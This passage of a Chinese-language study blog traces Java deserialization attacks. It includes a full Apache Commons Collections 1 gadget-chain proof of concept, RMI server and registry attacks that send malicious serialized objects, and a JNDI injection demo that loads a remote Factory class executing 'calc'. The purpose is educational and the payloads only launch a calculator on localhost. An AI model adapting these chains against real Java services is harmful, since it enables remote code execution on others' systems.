alt></p><p>在往上回溯，发现并没有直接调用<code>invoke</code>方法，因为这里用到了<strong>动态代理</strong>机制，当生成的代理实例调用方法时会先调用类里的<code>invoke</code>方法。<code>AnnotationInvocationHandler</code>实现了<code>InvocationHandler</code>接口，所以再往上回溯又是一个<code>AnnotationInvocationHandler</code>，但它的<code>memberValues</code>属性是<code>AnnotationInvocationHandler</code>的代理实例。</p><p>最后完整的POC：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="hljs-keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApacheCommonsCollections1</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">null</span>&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">"calc.exe"</span>&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map map = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class cls = Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map);</span><br><span class="line"></span><br><span class="line">        Map map1 = (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,</span><br><span class="line">                invocationHandler</span><br><span class="line">        );</span><br><span class="line">        Object obj = constructor.newInstance(Retention.class, map1);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">"cc1.txt"</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CommonsCollections</code>后面几条链看了下最后都是通过<code>transform</code>方法反射执行命令的，就是入口类和中间衔接类不一样，<code>CommonsCollections5</code>也跟了下，无需动态代理，相比<code>CommonsCollections1</code>构造起来还更简单。</p><h3 id="RMI攻击服务端"><a href="#RMI攻击服务端" class="headerlink" title="RMI攻击服务端"></a>RMI攻击服务端</h3><p>攻击服务端的方式我看到有两种(可能还有更多的我不知道)，一种是远程方法的参数有通过类实例的，构造恶意的实例传过去；另一种是使用<code>bind</code>方法注册绑定一个恶意的实例。</p><ul><li><p>远程方法参数有类实例</p><p>由于RMI传的参数都是经过序列化的，那么在服务端那边就会进行反序列化还原对象。这里我就想到了个问题，实现远程方法的类没有实现<code>Serializable</code>为什么又能被序列化呢？原因就在实现远程方法的类继承的<code>UnicastRemoteObject</code>类上，只要一直回溯，不难发现<code>UnicastRemoteObject</code>的最终父类是<code>RemoteObject</code>，是它实现了<code>Serializable</code>。</p><p>现在我们参数传一个精心构造的反序列化链就能造成反序列化漏洞，但如果这个参数的类不能作为反序列化的入口类的话，我们通过入口类继承原来的类，实现反序列化任意类。这里还是以<code>CommonsCollections</code>为例，但修改<code>CommonsCollections</code>原有的入口类挺麻烦的，Demo简化一下，服务端刚好有一个实现了<code>Serializable</code>的类，类里还有一个<code>Object</code>属性。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;</span><br><span class="line">      Object obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端远程方法的参数是<code>Exception</code>类，那么客户端的<code>Exploit</code>就有稍稍修改下，继承<code>Exception</code>类。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;</span><br><span class="line">      Object obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后客户端实例化一个<code>Exploit</code>对象，设置它的<code>obj</code>属性为<code>CommonsCollections</code>的POP链即可。</p><p>放上Demo的代码：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="hljs-comment">// 服务端RMIServer.java</span></span><br><span class="line">  <span class="hljs-keyword">package</span> com.test;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line">  <span class="hljs-keyword">import</span> java.rmi.RemoteException;</span><br><span class="line">  <span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIServer</span> </span>&#123;</span><br><span class="line">      <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException </span>&#123;</span><br><span class="line">          LocateRegistry.createRegistry(<span class="hljs-number">8888</span>).bind(<span class="hljs-string">"method"</span>,<span class="hljs-keyword">new</span> RemoteMethodImpl());</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//服务端RemoteMethodImpl.java</span></span><br><span class="line"><span class="hljs-keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="hljs-keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RemoteMethodImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RemoteMethod</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">RemoteMethodImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">read</span><span class="hljs-params">(Exception obj)</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">      in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="hljs-comment">//客户端服务端相同RemoteMethod.java</span></span><br><span class="line">  <span class="hljs-keyword">package</span> com.test;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="hljs-keyword">import</span> java.rmi.RemoteException;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">RemoteMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Remote</span> </span>&#123;</span><br><span class="line">      <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">read</span><span class="hljs-params">(Exception obj)</span> <span class="hljs-keyword">throws</span> RemoteException</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">  <span class="hljs-comment">//客户端利用代码</span></span><br><span class="line">  <span class="hljs-keyword">package</span> com.test;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line">  <span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line">  <span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-keyword">import</span> java.io.Serializable;</span><br><span class="line">  <span class="hljs-keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">  <span class="hljs-keyword">import</span> java.lang.reflect.*;</span><br><span class="line">  <span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">  <span class="hljs-keyword">import</span> java.util.*;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span> </span>&#123;</span><br><span class="line">      <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          RemoteMethod remoteMethod = (RemoteMethod) LocateRegistry.getRegistry(<span class="hljs-number">8888</span>).lookup(<span class="hljs-string">"method"</span>);</span><br><span class="line">  </span><br><span class="line">          Exploit exploit = <span class="hljs-keyword">new</span> Exploit();</span><br><span class="line">          exploit.obj = getPayload();</span><br><span class="line">          remoteMethod.read(exploit);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;</span><br><span class="line">                  <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">null</span>&#125;),</span><br><span class="line">                  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),</span><br><span class="line">                  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">"calc.exe"</span>&#125;),</span><br><span class="line">                  <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)</span><br><span class="line">          &#125;;</span><br><span class="line">          ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">          Map map = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), chainedTransformer);</span><br><span class="line">  </span><br><span class="line">          Class cls = Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">          Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">          constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">          InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map);</span><br><span class="line">  </span><br><span class="line">          Map map1 = (Map) Proxy.newProxyInstance(</span><br><span class="line">                  Map.class.getClassLoader(),</span><br><span class="line">                  <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,</span><br><span class="line">                  invocationHandler</span><br><span class="line">          );</span><br><span class="line">          Object obj = constructor.newInstance(Retention.class, map1);</span><br><span class="line">          <span class="hljs-keyword">return</span> obj;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;</span><br><span class="line">      Object obj;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>   在调用栈里可以看到，远程方法的参数是<code>Exception</code>类，反序列化的对象实际上是<code>Exploit</code>。</p><p>  <img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-20 100240.png" alt></p><ul><li><p>注册恶意实例</p><p>如果rmiregistry和服务端分开的话，这种情况实际攻击的是rmiregistry。rmiregistry在将注册名和<code>Romte</code>对象绑定时会将这两个值反序列化，可利用这个特性反序列化POP链。如果这个链入口类没有继承<code>Remote</code>类，可以使用动态代理的方式生成<code>Remote</code>的代理类。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler obj = (InvocationHandler) getPayload();</span><br><span class="line">RemoteMethod remote = (RemoteMethod) Proxy.newProxyInstance(</span><br><span class="line">    RemoteMethod.class.getClassLoader(),</span><br><span class="line">    <span class="hljs-keyword">new</span> Class[]&#123;RemoteMethod.class&#125;,</span><br><span class="line">    obj</span><br><span class="line">);</span><br><span class="line">LocateRegistry.getRegistry(<span class="hljs-number">8888</span>).rebind(<span class="hljs-string">"hack"</span>, remote);</span><br></pre></td></tr></table></figure><p>下断点可以看到反序列化操作是在<code>RegistryImpl_Skel</code>类的<code>dispatch</code>方法进行的。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-20 135651.png" alt></p></li></ul><h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>RMI除了绑定<code>Remote</code>对象之外，还可绑定<code>ReferenceWrapper</code>对象，<code>ReferenceWrapper</code>里的<code>Reference</code>属性记录<code>Factory</code>类的名称、包名和地址。当<code>InitialContext</code>类或他的子类对象直接或间接的调用<code>lookup</code>方法，同时<code>name</code>参数可控时，从JNDI接口获取攻击者的<code>Reference</code>对象，然后从攻击者的服务器下载<code>Factory</code>并实例化，攻击者在静态代码或构造方法加入执行命令的代码，就能在实例化的时候实现命令执行。</p><p>放上Demo代码：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// RMIServer.java</span></span><br><span class="line"><span class="hljs-keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="hljs-keyword">import</span> java.rmi.registry.*;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">8888</span>);</span><br><span class="line"></span><br><span class="line">        Reference reference = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">"Exploit2"</span>, <span class="hljs-string">"com.exploit.Exploit2"</span>, <span class="hljs-string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="hljs-string">"calc"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// RMIClinet.java</span></span><br><span class="line"><span class="hljs-keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Context ctx = <span class="hljs-keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(<span class="hljs-string">"rmi://localhost:8888/calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意的<code>Factory</code>类：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">static</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="hljs-string">"calc"</span>);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Exploit2() <span class="hljs-keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="hljs-string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时起一个python的<code>SimpleHTTPServer</code>，来作为<code>Factroy</code>类的下载服务。这里有一个坑，一开始我是直接<code>http://127.0.0.1:8081/Exploit2.class</code>下载<code>Factroy</code>类，在测试中虽然发起了下载请求，但并没有弹计算器，一度以为我的代码写得有问题，参考了别人的Demo代码，<code>factroyLocation</code>设置的是下载服务的根目录，用<code>SimpleHTTPServer</code>测试下，请求的地址会变为<code>http://127.0.0.1:8081/com/exploit/Exploit2.class</code>，所以下载目录要跟报名相同或者请求任意地址都下载<code>Factroy</code>才行。</p><p>万事俱备，开调。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-24 121404.png" alt></p><p>前两个<code>lookup</code>方法都是套娃调用，直接跟进到<code>RegistryContext</code>的<code>lookup</code>方法。使用绑定的<code>ReferenceWrapper</code>和对应的<code>Name</code>调用<code>decodeObject</code>方法。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-24 122523.png" alt></p><p>跟进到<code>decodeObject</code>方法，获取<code>Reference</code>对象，并使用<code>Reference</code>对象和<code>Name</code>对象调用<code>getObjectInstance</code>方法。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> Object <span class="hljs-title">decodeObject</span><span class="hljs-params">(Remote var1, Name var2)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">        Object var3 = var1 <span class="hljs-keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="hljs-keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="hljs-keyword">this</span>, <span class="hljs-keyword">this</span>.environment);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getObjectInstance</code>方法里又继续通过<code>Reference</code>对象和<code>factory</code>类名调用<code>getObjectFactoryFromReference</code>方法获取对象。接着跟进<code>getObjectFactoryFromReference</code>方法，有两个地方调用<code>loadClass</code>，此时的调用栈是第二个<code>loadClass</code>。第一个<code>loadClass</code>是从当前<code>classPath</code>获取类的Class实例。如果恶意类和客户端同在一个项目，需要把恶意类编译后的<code>.class</code>文件删掉才会从远程下载恶意类。后续如<code>clas</code>为<code>null</code>，也就是本地没这个<code>factory</code>类时，获取<code>codebase</code>，也就是初始化<code>Reference</code>时的<code>factoryName</code>属性，调用另一个<code>loadClass</code>方法。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> ObjectFactory <span class="hljs-title">getObjectFactoryFromReference</span><span class="hljs-params">(Reference ref, String factoryName)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, InstantiationException, MalformedURLException </span>&#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="hljs-keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// Try to use current class loader</span></span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="hljs-comment">// ignore and continue</span></span><br><span class="line">            <span class="hljs-comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// Not in class path; try to use codebase</span></span><br><span class="line">        String codebase;</span><br><span class="line">        <span class="hljs-keyword">if</span> (clas == <span class="hljs-keyword">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="hljs-keyword">null</span>) 